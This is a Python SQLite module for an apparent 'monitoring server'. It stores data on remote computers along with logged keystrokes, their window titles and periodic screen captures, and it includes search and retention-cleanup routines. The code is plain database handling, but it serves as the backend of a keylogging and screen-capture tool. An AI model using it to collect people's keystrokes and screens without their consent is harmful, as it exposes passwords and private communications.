"""
Database module for SQLite operations.
Handles all data persistence for the monitoring server.
"""

import sqlite3
import json
import asyncio
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Any
from contextlib import asynccontextmanager
import threading
import os

# Default database path from environment variable
DEFAULT_DB_PATH = os.getenv("DATABASE_PATH", "monitoring.db")


class Database:
    """
    SQLite database manager with thread-safe operations.
    """
    
    def __init__(self, db_path: str = None):
        """
        Initialize database connection.
        
        Args:
            db_path: Path to SQLite database file (uses DATABASE_PATH env var if not provided)
        """
        self.db_path = db_path or DEFAULT_DB_PATH
        # Ensure directory exists
        db_dir = os.path.dirname(self.db_path)
        if db_dir and not os.path.exists(db_dir):
            os.makedirs(db_dir, exist_ok=True)
        self.local = threading.local()
        self._init_db()
    
    def _get_connection(self) -> sqlite3.Connection:
        """
        Get thread-local database connection.
        
        Returns:
            SQLite connection
        """
        if not hasattr(self.local, 'conn') or self.local.conn is None:
            self.local.conn = sqlite3.connect(
                self.db_path,
                check_same_thread=False,
                timeout=30
            )
            self.local.conn.row_factory = sqlite3.Row
            self.local.conn.execute("PRAGMA journal_mode=WAL")
            self.local.conn.execute("PRAGMA synchronous=NORMAL")
            self.local.conn.execute("PRAGMA cache_size=-64000")  # 64MB cache
        return self.local.conn
    
    def _init_db(self):
        """Initialize database schema."""
        conn = self._get_connection()
        cursor = conn.cursor()
        
        # Computers table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS computers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                computer_name TEXT NOT NULL,
                mac_address TEXT UNIQUE NOT NULL,
                ip_address TEXT,
                country TEXT,
                browser TEXT,
                os TEXT,
                resolution TEXT,
                username TEXT,
                online BOOLEAN DEFAULT 0,
                last_seen TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Keyboard events table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS keyboard_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                computer_id INTEGER NOT NULL,
                key TEXT NOT NULL,
                window TEXT,
                time TIMESTAMP NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (computer_id) REFERENCES computers(id)
            )
        """)
        
        # Frames table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS frames (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                computer_id INTEGER NOT NULL,
                image_path TEXT NOT NULL,
                time TIMESTAMP NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (computer_id) REFERENCES computers(id)
            )
        """)
        
        # Create indexes for performance
        cursor.execute("""
            CREATE INDEX IF NOT EXISTS idx_keyboard_events_computer_id 
            ON keyboard_events(computer_id)
        """)
        cursor.execute("""
            CREATE INDEX IF NOT EXISTS idx_keyboard_events_time 
            ON keyboard_events(time)
        """)
        cursor.execute("""
            CREATE INDEX IF NOT EXISTS idx_frames_computer_id 
            ON frames(computer_id)
        """)
        cursor.execute("""
            CREATE INDEX IF NOT EXISTS idx_frames_time 
            ON frames(time)
        """)
        cursor.execute("""
            CREATE INDEX IF NOT EXISTS idx_computers_mac_address 
            ON computers(mac_address)
        """)
        cursor.execute("""
            CREATE INDEX IF NOT EXISTS idx_computers_online 
            ON computers(online)
        """)
        
        conn.commit()
    
    # Computer operations
    
    def upsert_computer(self, device_info: Dict[str, Any]) -> int:
        """
        Insert or update computer record.
        
        Args:
            device_info: Dictionary with device information
            
        Returns:
            Computer ID
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        mac_address = device_info.get("mac_address")
        computer_name = device_info.get("computer_name")
        ip_address = device_info.get("ip_address")
        browser = device_info.get("browser")
        os_info = device_info.get("os")
        resolution = device_info.get("resolution")
        username = device_info.get("username")
        
        # Try to find existing computer by MAC address
        cursor.execute(
            "SELECT id FROM computers WHERE mac_address = ?",
            (mac_address,)
        )
        row = cursor.fetchone()
        
        if row:
            # Update existing record
            computer_id = row["id"]
            cursor.execute("""
                UPDATE computers 
                SET computer_name = ?, ip_address = ?, browser = ?, 
                    os = ?, resolution = ?, username = ?, 
                    online = 1, last_seen = CURRENT_TIMESTAMP,
                    updated_at = CURRENT_TIMESTAMP
                WHERE id = ?
            """, (computer_name, ip_address, browser, os_info, 
                  resolution, username, computer_id))
        else:
            # Insert new record
            cursor.execute("""
                INSERT INTO computers 
                (computer_name, mac_address, ip_address, country, browser, os, 
                 resolution, username, online, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP)
            """, (computer_name, mac_address, ip_address, None, browser, 
                  os_info, resolution, username))
            computer_id = cursor.lastrowid
        
        conn.commit()
        return computer_id
    
    def get_computer(self, computer_id: int) -> Optional[Dict[str, Any]]:
        """
        Get computer by ID.
        
        Args:
            computer_id: Computer ID
            
        Returns:
            Computer dictionary or None
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cursor.execute(
            "SELECT * FROM computers WHERE id = ?",
            (computer_id,)
        )
        row = cursor.fetchone()
        
        if row:
            return dict(row)
        return None
    
    def get_computer_by_mac(self, mac_address: str) -> Optional[Dict[str, Any]]:
        """
        Get computer by MAC address.
        
        Args:
            mac_address: MAC address
            
        Returns:
            Computer dictionary or None
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cursor.execute(
            "SELECT * FROM computers WHERE mac_address = ?",
            (mac_address,)
        )
        row = cursor.fetchone()
        
        if row:
            return dict(row)
        return None
    
    def get_all_computers(self, online_only: bool = False) -> List[Dict[str, Any]]:
        """
        Get all computers.
        
        Args:
            online_only: If True, only return online computers
            
        Returns:
            List of computer dictionaries
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        if online_only:
            cursor.execute(
                "SELECT * FROM computers WHERE online = 1 ORDER BY last_seen DESC"
            )
        else:
            cursor.execute(
                "SELECT * FROM computers ORDER BY last_seen DESC"
            )
        
        rows = cursor.fetchall()
        return [dict(row) for row in rows]
    
    def search_computers(self, query: str) -> List[Dict[str, Any]]:
        """
        Search computers by name or MAC address.
        
        Args:
            query: Search query
            
        Returns:
            List of matching computer dictionaries
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        search_pattern = f"%{query}%"
        cursor.execute("""
            SELECT * FROM computers 
            WHERE computer_name LIKE ? OR mac_address LIKE ?
            ORDER BY last_seen DESC
        """, (search_pattern, search_pattern))
        
        rows = cursor.fetchall()
        return [dict(row) for row in rows]
    
    def set_computer_online(self, computer_id: int, online: bool = True):
        """
        Set computer online status.
        
        Args:
            computer_id: Computer ID
            online: Online status
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cursor.execute("""
            UPDATE computers 
            SET online = ?, last_seen = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP
            WHERE id = ?
        """, (1 if online else 0, computer_id))
        
        conn.commit()
    
    def mark_offline_computers(self, timeout_seconds: int = 30):
        """
        Mark computers as offline if they haven't been seen recently.
        
        Args:
            timeout_seconds: Timeout in seconds
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cutoff_time = datetime.utcnow() - timedelta(seconds=timeout_seconds)
        
        cursor.execute("""
            UPDATE computers 
            SET online = 0, updated_at = CURRENT_TIMESTAMP
            WHERE online = 1 AND last_seen < ?
        """, (cutoff_time.isoformat(),))
        
        conn.commit()
    
    # Keyboard event operations
    
    def add_keyboard_event(self, computer_id: int, event: Dict[str, Any]) -> int:
        """
        Add keyboard event.
        
        Args:
            computer_id: Computer ID
            event: Keyboard event dictionary
            
        Returns:
            Event ID
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO keyboard_events (computer_id, key, window, time)
            VALUES (?, ?, ?, ?)
        """, (
            computer_id,
            event.get("key"),
            event.get("window"),
            event.get("time")
        ))
        
        conn.commit()
        return cursor.lastrowid
    
    def add_keyboard_events_batch(self, computer_id: int, events: List[Dict[str, Any]]):
        """
        Add multiple keyboard events in a single transaction.
        
        Args:
            computer_id: Computer ID
            events: List of keyboard event dictionaries
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        for event in events:
            cursor.execute("""
                INSERT INTO keyboard_events (computer_id, key, window, time)
                VALUES (?, ?, ?, ?)
            """, (
                computer_id,
                event.get("key"),
                event.get("window"),
                event.get("time")
            ))
        
        conn.commit()
    
    def get_keyboard_events(
        self,
        computer_id: int,
        limit: int = 100,
        offset: int = 0,
        start_time: Optional[str] = None,
        end_time: Optional[str] = None,
        window_filter: Optional[str] = None
    ) -> List[Dict[str, Any]]:
        """
        Get keyboard events for a computer.
        
        Args:
            computer_id: Computer ID
            limit: Maximum number of events
            offset: Offset for pagination
            start_time: Optional start time filter
            end_time: Optional end time filter
            window_filter: Optional window name filter
            
        Returns:
            List of keyboard event dictionaries
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        query = "SELECT * FROM keyboard_events WHERE computer_id = ?"
        params = [computer_id]
        
        if start_time:
            query += " AND time >= ?"
            params.append(start_time)
        
        if end_time:
            query += " AND time <= ?"
            params.append(end_time)
        
        if window_filter:
            query += " AND window LIKE ?"
            params.append(f"%{window_filter}%")
        
        query += " ORDER BY time DESC LIMIT ? OFFSET ?"
        params.extend([limit, offset])
        
        cursor.execute(query, params)
        rows = cursor.fetchall()
        return [dict(row) for row in rows]
    
    def delete_old_keyboard_events(self, days: int = 7):
        """
        Delete keyboard events older than specified days.
        
        Args:
            days: Number of days to keep
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cutoff_time = datetime.utcnow() - timedelta(days=days)
        
        cursor.execute("""
            DELETE FROM keyboard_events 
            WHERE created_at < ?
        """, (cutoff_time.isoformat(),))
        
        conn.commit()
    
    # Frame operations
    
    def add_frame(self, computer_id: int, image_path: str, timestamp: str) -> int:
        """
        Add frame record.
        
        Args:
            computer_id: Computer ID
            image_path: Path to saved image
            timestamp: Frame timestamp
            
        Returns:
            Frame ID
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO frames (computer_id, image_path, time)
            VALUES (?, ?, ?)
        """, (computer_id, image_path, timestamp))
        
        conn.commit()
        return cursor.lastrowid
    
    def get_frames(
        self,
        computer_id: int,
        limit: int = 10,
        offset: int = 0
    ) -> List[Dict[str, Any]]:
        """
        Get frames for a computer.
        
        Args:
            computer_id: Computer ID
            limit: Maximum number of frames
            offset: Offset for pagination
            
        Returns:
            List of frame dictionaries
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT * FROM frames 
            WHERE computer_id = ? 
            ORDER BY time DESC 
            LIMIT ? OFFSET ?
        """, (computer_id, limit, offset))
        
        rows = cursor.fetchall()
        return [dict(row) for row in rows]
    
    def delete_old_frames(self, days: int = 1):
        """
        Delete frame records older than specified days.
        
        Args:
            days: Number of days to keep
        """
        conn = self._get_connection()
        cursor = conn.cursor()
        
        cutoff_time = datetime.utcnow() - timedelta(days=days)
        
        # Get old frames to delete images
        cursor.execute("""
            SELECT image_path FROM frames 
            WHERE created_at < ?
        """, (cutoff_time.isoformat(),))
        
        rows = cursor.fetchall()
        
        # Delete image files
        for row in rows:
            try:
                image_path = row["image_path"]
                if os.path.exists(image_path):
                    os.remove(image_path)
            except Exception as e:
                print(f"Error deleting image {image_path}: {e}")
        
        # Delete database records
        cursor.execute("""
            DELETE FROM frames 
            WHERE created_at < ?
        """, (cutoff_time.isoformat(),))
        
        conn.commit()
    
    # Cleanup
    
    def cleanup_old_data(self, keyboard_days: int = 7, frame_days: int = 1):
        """
        Clean up old data.
        
        Args:
            keyboard_days: Days to keep keyboard events
            frame_days: Days to keep frames
        """
        self.delete_old_keyboard_events(keyboard_days)
        self.delete_old_frames(frame_days)
    
    def close(self):
        """Close database connection."""
        if hasattr(self.local, 'conn') and self.local.conn:
            self.local.conn.close()
            self.local.conn = None


# Global database instance
_db_instance: Optional[Database] = None


def get_database(db_path: Optional[str] = None) -> Database:
    """
    Get or create global database instance.
    
    Args:
        db_path: Optional path to database file. When omitted, uses the
            DATABASE_PATH environment variable.
        
    Returns:
        Database instance
    """
    global _db_instance
    if _db_instance is None:
        _db_instance = Database(db_path)
    return _db_instance
